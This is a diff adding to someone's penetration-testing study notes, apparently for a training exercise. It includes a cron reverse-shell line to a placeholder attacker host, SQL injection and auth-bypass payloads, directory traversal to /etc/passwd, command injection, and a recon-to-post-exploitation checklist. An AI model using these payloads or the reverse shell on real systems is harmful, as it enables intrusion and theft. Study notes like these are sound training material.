@@ -447,3 +447,71 @@ journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4
 # Creating a reverse shell 
 crontab -e
 */5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/attacker/port 0>&1'
+
+
+
+
+
+# Review from Dryrun
+### scan ip address
+    namp <ip>
+    nc ip port
+### navigate webserver
+file to read = directory traversal technique ../../../../../ ex. /etc/passwd /etc/hosts -> view page source
+upload files = upload shell
+login screen = Authentication bypass ' or 1='1'
+decode sting = cmd injection
+
+### ping sweep ips 
+     for i in {97..126}; do (ping -c 1 192.168.28.$i | grep "bytes from"&); done
+
+### selections screen
+OR 1=1 in URL
+UNION Select 1,2,3..... until error
+edit golden statement
+union select column, column, column from database.table
+
+## When on system
+        find / -type f -perm /4000 -ls 2>/dev/null # find SUID only files
+        find / -type f -perm /2000 -ls 2>/dev/null # find SGID only files
+        find / -type f -perm /6000 -ls 2>/dev/null # find SUID and SGID only files
+
+## If on windows machine
+        look in folders, task schduler, look for task without descriptions 
+
+
+
+
+
+# Methodology 
+## Recon
+Ping
+Nmap/NC ports, make needed port forwards and navigate to the webserver. interact with the server as usua.
+## web esploitation
+test exploitation based on the contect of pages
+examples: command injection ;whoami
+         directory traversal ../../../../../etc/passwd
+         auth bypass ' OR 1='1
+## SQL INjecection
+find the vulnerabkle field or1=1 in URL for get or '1 or 1-"1 for post
+idenditfy number of coloumns union select1,2,3,
+Goldern Statement
+craft queries
+
+## reverse engineering
+static analysis - file, strings
+Behavior analysis run the file fuzzing 
+dynamic analysis -ghidra, search for stings for starting point
+## exploit developement
+Test how script takes input
+./func <<<$(echo "string")
+parameter ./func strings of chracter
+GDB
+write script in /tmp
+Execute on target system (local buffer Overflow)
+## Post exploitation 
+host enumertation (passwd, hosts, home)
+sudo -l list commands with sudo access, finds target and accounts the exploit
+find -perm coommand
+tasks scheduler services, crontab
+registry keys, 
